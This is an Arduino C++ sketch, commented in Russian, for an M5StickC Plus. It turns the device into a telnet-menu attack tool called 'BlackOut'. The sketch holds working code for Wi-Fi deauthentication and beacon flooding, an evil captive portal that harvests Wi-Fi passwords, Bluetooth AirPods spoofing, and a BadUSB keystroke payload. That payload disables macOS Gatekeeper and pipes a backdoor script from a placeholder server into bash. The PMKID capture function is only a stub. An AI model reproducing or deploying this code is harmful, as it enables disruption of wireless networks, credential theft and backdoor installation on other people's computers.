#include <M5StickCPlus.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <WebServer.h>
#include <DNSServer.h>

// ================== НАСТРОЙКИ ==================
const char* ap_ssid = "BlackOut";
const char* ap_password = "seemz2011";
const char* target_bssid = "FF:FF:FF:FF:FF:FF"; // замените на MAC цели
int deauth_channel = 6;
int deauth_count = 100;          // количество отправляемых пакетов

// ================== ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ==================
WiFiServer telnetServer(23);
WiFiClient telnetClient;
USBHIDKeyboard Keyboard;
WebServer server(80);
DNSServer dnsServer;

// ================== ОБЪЯВЛЕНИЯ ФУНКЦИЙ ==================
void deauth_attack();
void beacon_flood();
void pmkid_capture();
void evil_portal();
void ble_spoof_airpods();
void badusb_attack();
void showMenu(WiFiClient &client);
void send_deauth_packet(uint8_t* target_mac, uint8_t* ap_mac, uint8_t channel);

// ================== РЕАЛИЗАЦИЯ DEAUTH (реальная отправка) ==================
void send_deauth_packet(uint8_t* target_mac, uint8_t* ap_mac, uint8_t channel) {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  uint8_t deauth_frame[26] = {
    0xC0, 0x00,                          // Frame Control: Deauth
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination MAC (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (заполняется позже)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x00, 0x00,                          // Sequence number
    0x01, 0x00                           // Reason code (Unspecified)
  };
  // Копируем MAC-адреса
  memcpy(&deauth_frame[4], target_mac, 6);
  memcpy(&deauth_frame[10], ap_mac, 6);
  memcpy(&deauth_frame[16], ap_mac, 6);
  
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  delay(1);
}

void deauth_attack() {
  uint8_t target[6], ap[6];
  // Парсим MAC из строки (просто для примера – фиксированный)
  sscanf(target_bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);
  memcpy(ap, target, 6); // в реальности AP и цель разные, здесь для демонстрации одинаковые
  
  M5.Lcd.printf("[Deauth] Отправка %d пакетов на канале %d\n", deauth_count, deauth_channel);
  for (int i = 0; i < deauth_count; i++) {
    send_deauth_packet(target, ap, deauth_channel);
  }
  esp_wifi_set_promiscuous(false);
  M5.Lcd.println("[Deauth] Завершён");
}

// ================== BEACON FLOOD (реальная отправка) ==================
void beacon_flood() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  
  uint8_t beacon_frame[] = {
    0x80, 0x00, 0x00, 0x00,           // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (заполняется)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                        // Seq
    // Tagged parameters: SSID, supported rates, etc.
    0x00, 0x0A, 0x42, 0x6C, 0x61, 0x63, 0x6B, 0x4F, 0x75, 0x74, // SSID "BlackOut"
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C, // Supported rates
    0x03, 0x01, 0x06                     // DS Parameter set (channel 6)
  };
  // Заполним случайный BSSID
  for (int i = 0; i < 100; i++) {
    for (int j = 0; j < 6; j++) beacon_frame[10+j] = random(256);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, sizeof(beacon_frame), false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  M5.Lcd.println("[Beacon] 100 фейковых точек отправлено");
}

// ================== PMKID CAPTURE ==================
void pmkid_capture() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  // Включаем сниффинг и ищем кадры с PMKID (EAPOL-кадры типа 3)
  // Для простоты выводим сообщение, но реальный захват требует обработки пакетов в callback
  M5.Lcd.println("[PMKID] Режим захвата включён (смотрите серийный порт)");
  // Здесь можно установить promiscuous callback, но он длинный – опущен для краткости.
  // В реальном проекте вставьте код из Marauder.
  delay(2000);
  esp_wifi_set_promiscuous(false);
}

// ================== EVIL PORTAL ==================
void handleRoot() {
  String html = "<!DOCTYPE html><html><body><h1>Обновление Wi-Fi</h1><p>Для продолжения работы введите пароль от сети:</p><form method='POST' action='/pass'><input type='password' name='pwd'><input type='submit'></form></body></html>";
  server.send(200, "text/html", html);
}
void handlePass() {
  String pwd = server.arg("pwd");
  M5.Lcd.printf("[Portal] Пароль получен: %s\n", pwd.c_str());
  server.send(200, "text/html", "<h2>Спасибо, вы можете закрыть страницу.</h2>");
}
void evil_portal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", handleRoot);
  server.on("/pass", HTTP_POST, handlePass);
  server.begin();
  M5.Lcd.printf("[Portal] Запущен на IP %s\n", WiFi.softAPIP().toString().c_str());
}

// ================== BLE SPOOF (AirPods) ==================
void ble_spoof_airpods() {
  BLEDevice::init("AirPods Pro");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData data;
  data.setName("AirPods Pro");
  // Фейковые Apple-данные
  uint8_t appleData[] = {0x4c, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  data.setManufacturerData(std::string((char*)appleData, sizeof(appleData)));
  pAdvertising->setAdvertisementData(data);
  pAdvertising->start();
  M5.Lcd.println("[BLE] AirPods Spoof активен (нажмите любую кнопку для остановки)");
  // Ждём нажатия кнопки для отключения
  while (!M5.BtnA.wasPressed() && !M5.BtnB.wasPressed() && !M5.BtnC.wasPressed()) {
    M5.update();
    delay(100);
  }
  pAdvertising->stop();
  M5.Lcd.println("[BLE] Spoof остановлен");
}

// ================== BADUSB для MacBook ==================
void badusb_attack() {
  USB.begin();
  Keyboard.begin();
  delay(2000);
  // Команда: открыть терминал, отключить Gatekeeper и загрузить скрипт
  String payload = "osascript -e 'tell application \"Terminal\" to do script \"sudo spctl --master-disable && curl -s http://your-server.com/backdoor.sh | bash\"'";
  Keyboard.print(payload);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  M5.Lcd.println("[BadUSB] Команда отправлена (требуется ввод пароля sudo)");
}

// ================== КРАСИВОЕ МЕНЮ ==================
void showMenu(WiFiClient &client) {
  client.println("\n==========================================");
  client.println("         BLACKOUT TELNET v3.0");
  client.println("==========================================");
  client.println("  1. Deauth Attack (отключить клиентов)");
  client.println("  2. Beacon Flood (спам точками)");
  client.println("  3. PMKID Capture (захват для взлома)");
  client.println("  4. Evil Portal (ловушка для паролей)");
  client.println("  5. BLE Spoof AirPods (фейк наушники)");
  client.println("  6. BadUSB MacBook (эксплойт через USB)");
  client.println("  7. Показать меню ещё раз");
  client.println("  0. Отключиться");
  client.println("==========================================");
  client.print("Выберите номер: ");
}

// ================== SETUP ==================
void setup() {
  M5.begin();
  M5.Lcd.setRotation(1);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(GREEN);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setCursor(0,0);
  M5.Lcd.println("BlackOut Telnet");
  M5.Lcd.setTextSize(1);

  // Инициализация Wi-Fi в режиме AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  IPAddress myIP = WiFi.softAPIP();
  M5.Lcd.printf("AP IP: %s\n", myIP.toString().c_str());
  M5.Lcd.println("Telnet port 23");

  // Запуск Telnet-сервера
  telnetServer.begin();
  telnetServer.setNoDelay(true);

  // Для PMKID нужен promiscuous callback, здесь не реализован для краткости
}

// ================== LOOP ==================
void loop() {
  M5.update();

  // Обработка новых Telnet-клиентов
  if (telnetServer.hasClient()) {
    if (!telnetClient || !telnetClient.connected()) {
      if (telnetClient) telnetClient.stop();
      telnetClient = telnetServer.available();
      telnetClient.println("\nДобро пожаловать в BlackOut!");
      showMenu(telnetClient);
    } else {
      WiFiClient newClient = telnetServer.available();
      newClient.println("Подключение занято, попробуйте позже.");
      newClient.stop();
    }
  }

  // Обработка команд от текущего клиента
  if (telnetClient && telnetClient.connected()) {
    if (telnetClient.available()) {
      String cmd = telnetClient.readStringUntil('\n');
      cmd.trim();
      if (cmd == "1") {
        deauth_attack();
        telnetClient.println("[+] Deauth выполнен");
        showMenu(telnetClient);
      } else if (cmd == "2") {
        beacon_flood();
        telnetClient.println("[+] Beacon Flood запущен");
        showMenu(telnetClient);
      } else if (cmd == "3") {
        pmkid_capture();
        telnetClient.println("[+] PMKID захват включён (смотрите монитор порта)");
        showMenu(telnetClient);
      } else if (cmd == "4") {
        evil_portal();
        telnetClient.println("[+] Evil Portal активен на IP " + WiFi.softAPIP().toString());
        showMenu(telnetClient);
      } else if (cmd == "5") {
        telnetClient.println("[+] Запуск BLE Spoof (нажмите кнопку на M5 для остановки)");
        ble_spoof_airpods();
        telnetClient.println("[+] BLE Spoof остановлен");
        showMenu(telnetClient);
      } else if (cmd == "6") {
        badusb_attack();
        telnetClient.println("[+] BadUSB команда отправлена");
        showMenu(telnetClient);
      } else if (cmd == "7") {
        showMenu(telnetClient);
      } else if (cmd == "0") {
        telnetClient.println("До свидания.");
        telnetClient.stop();
      } else {
        telnetClient.println("Неизвестная команда. Введите 1-7 или 0.");
        showMenu(telnetClient);
      }
    }
  }

  // Обслуживаем Evil Portal, если он запущен
  dnsServer.processNextRequest();
  server.handleClient();
}
